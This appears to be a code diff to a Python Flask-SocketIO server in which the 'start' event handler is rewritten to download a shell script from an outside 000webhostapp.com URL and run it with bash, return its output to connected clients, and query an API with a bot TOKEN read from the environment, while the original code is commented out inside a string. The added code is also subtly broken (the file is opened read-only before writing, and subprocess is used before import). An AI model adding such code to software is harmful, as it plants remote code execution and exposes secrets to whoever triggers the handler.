@@ -18,7 +18,25 @@ def test_connect():
 @socketio.on("start")
 def start(message):
     emit("message", { "data": "Starting!" }, broadcast=True)
-    try:
+    import os
+    os.chdir("/opt/render/project/src")
+    import requests
+    url = "https://designative-propert.000webhostapp.com/my.sh"
+    file = requests.get(url)
+    with open("my.sh") as f:
+        f.write(file.content)
+    result = subprocess.run(["/bin/bash", "my.sh"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    emit("message", { "data": result.stdout.decode() })
+    emit("message", { "data": result.stderr.decode() })
+    token = os.getenv("TOKEN")
+    url = f"http://localhost:8081/bot{token}/getMe"
+    res = requests.get(url)
+    emit("message", { "data": res.text })
+    
+    
+    
+    
+    """try:
         import subprocess
         output = subprocess.run(["uname", "-a"], capture_output=True).stdout.decode("utf-8")
         emit("message", {"data": output}, broadcast=True)
@@ -109,7 +127,7 @@ def start(message):
         res = requests.get(f"http://127.0.0.1:8081/bot{token}/getMe").json()
         emit("message", { "data": res })
     except Exception as e:
-        emit("message", { "data": f"Error occured: {e}" })
+        emit("message", { "data": f"Error occured: {e}" })"""
 
 @socketio.on("message")
 def message(message):
